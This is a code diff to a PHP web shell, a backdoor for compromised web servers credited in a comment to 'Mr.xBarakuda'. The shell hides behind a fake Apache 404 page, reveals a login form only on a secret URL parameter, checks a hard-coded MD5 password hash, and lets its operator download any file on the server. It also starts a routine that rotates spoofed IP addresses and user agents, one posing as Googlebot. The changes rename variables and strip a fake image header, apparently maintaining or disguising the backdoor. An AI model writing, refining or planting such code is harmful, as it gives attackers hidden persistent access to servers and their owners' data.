@@ -14,9 +14,8 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 @ini_set('max_execution_time', 0);
 @clearstatcache();
-@header("ÿØÿà"); // \xff\xd8\xff\xe0
 @http_response_code(404);
-$katasandi = 'f5b165f0a2778d027ecebd64a2439c8d';
+$xk = 'f5b165f0a2778d027ecebd64a2439c8d';
 if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()) {
     function kudaxx($value, $preserveKeys = true) {
         if (is_array($value)) {
@@ -51,7 +50,6 @@ function login_shell() {
     echo " was not found on this server.
     <hr>
     <address>Apache Server at " . htmlspecialchars($_SERVER['HTTP_HOST']) . " Port 80</address>";
-
     if (isset($_GET['kudaxw00tz'])) {
         echo '<br><center>
                 <form method="post">
@@ -63,7 +61,7 @@ function login_shell() {
     echo "</body></html>";
 exit;
 }
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($katasandi) || (isset($_POST['pass']) && (md5($_POST['pass']) == $katasandi))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($xk) || (isset($_POST['pass']) && (md5($_POST['pass']) == $xk))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
 else login_shell();
 if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
 @ob_clean();
@@ -78,7 +76,7 @@ header('Content-Length: ' . filesize($file));
 readfile($file);
 exit;
 }
-// Bypass Sever Function by Mr.xBarakuda
+// Bypass Server Function by Mr.xBarakuda
 $ipRotations = ['192.0.2.10','198.51.100.23','203.0.113.45','203.0.113.46','198.51.100.24'];
 $selectedIp = $ipRotations[array_rand($ipRotations)];
 $userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1','Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'];
